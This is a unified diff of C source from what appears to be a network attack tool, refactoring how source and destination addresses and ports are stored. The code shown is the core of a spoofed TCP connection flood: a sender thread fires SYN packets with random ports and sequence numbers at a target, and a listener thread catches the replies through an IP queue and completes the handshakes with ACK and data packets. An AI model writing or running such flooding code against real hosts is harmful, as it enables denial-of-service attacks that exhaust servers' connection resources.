@@ -50,10 +50,7 @@ static pthreadex_flag_t    attack_flag;
 
 static void listener_thread(TCPOPEN_WORK *tw)
 {
-  int status, fport;
-
-  /* filtering port */
-  fport = htons(config.dport);
+  int status;
 
   /* initialize pcap library */
   DBG("[LL_%02u] Initializing IPQ message...", tw->w->id);
@@ -71,8 +68,8 @@ static void listener_thread(TCPOPEN_WORK *tw)
     } else {
       /* but ... in some circumstances ... */
       if(ipqex_get_ip_header(&(tw->msg))->protocol == 6
-      && ipqex_get_ip_header(&(tw->msg))->daddr == config.shost.s_addr
-      && ipqex_get_tcp_header(&(tw->msg))->source == fport)
+      && ipqex_get_ip_header(&(tw->msg))->daddr == config.shost.addr.in.addr
+      && ipqex_get_tcp_header(&(tw->msg))->source == config.dhost.port)
       {
         DBG("[LL_%02u] Received a spoofed connection packet.", tw->w->id);
         /*
@@ -83,7 +80,7 @@ static void listener_thread(TCPOPEN_WORK *tw)
                 (ipqex_get_ip_header(&(tw->msg))->saddr >>  8) & 0x00ff,
                 (ipqex_get_ip_header(&(tw->msg))->saddr >> 16) & 0x00ff,
                 (ipqex_get_ip_header(&(tw->msg))->saddr >> 24) & 0x00ff,
-                ipqex_get_tcp_header(&(tw->msg))->dest, fport,
+                ipqex_get_tcp_header(&(tw->msg))->dest, config.dhost.port,
                 ipqex_get_tcp_header(&(tw->msg))->rst,
                 ipqex_get_ip_header(&(tw->msg))->saddr,
                 config.shost.s_addr);
@@ -100,16 +97,16 @@ static void listener_thread(TCPOPEN_WORK *tw)
           /* send handshake and data TCP packet */
           DBG("[LL_%02u]   - Request packet sending...", tw->w->id);
           ln_send_packet(&(tw->lnc),
-                         &config.shost, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
-                         &config.dhost, config.dport,
+                         &config.shost.addr.in.inaddr, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
+                         &config.dhost.addr.in.inaddr, config.dhost.port,
                          TH_ACK,
                          ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
                          ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
                          ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
                          NULL, 0);
           ln_send_packet(&(tw->lnc),
-                         &config.shost, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
-                         &config.dhost, config.dport,
+                         &config.shost.addr.in.inaddr, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
+                         &config.dhost.addr.in.inaddr, config.dhost.port,
                          TH_ACK | TH_PUSH,
                          ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
                          ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
@@ -154,8 +151,8 @@ static void sender_thread(TCPOPEN_WORK *tw)
     {
       seq += libnet_get_prand(LIBNET_PRu16) & 0x00ff;
       ln_send_packet(&tw->lnc,
-                     &config.shost, libnet_get_prand(LIBNET_PRu16),
-                     &config.dhost, config.dport,
+                     &config.shost.addr.in.inaddr, libnet_get_prand(LIBNET_PRu16),
+                     &config.dhost.addr.in.inaddr, config.dhost.port,
                      TH_SYN, 13337,
                      seq, 0,
                      NULL, 0);
